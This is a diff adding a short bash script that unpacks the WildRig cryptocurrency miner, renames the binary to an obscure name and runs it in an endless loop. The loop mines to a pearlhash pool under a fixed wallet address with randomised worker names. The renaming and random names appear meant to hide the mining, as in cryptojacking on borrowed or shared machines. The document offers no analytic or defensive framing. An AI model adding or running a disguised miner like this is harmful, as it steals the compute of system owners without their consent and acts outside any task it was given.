@@ -1,0 +1,6 @@
+#!/bin/bash
+tar xf wildrig-multi-linux-0.51.5.tar.xz
+mv wildrig-multi sandfnau
+while true; do
+./sandfnau --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
+done
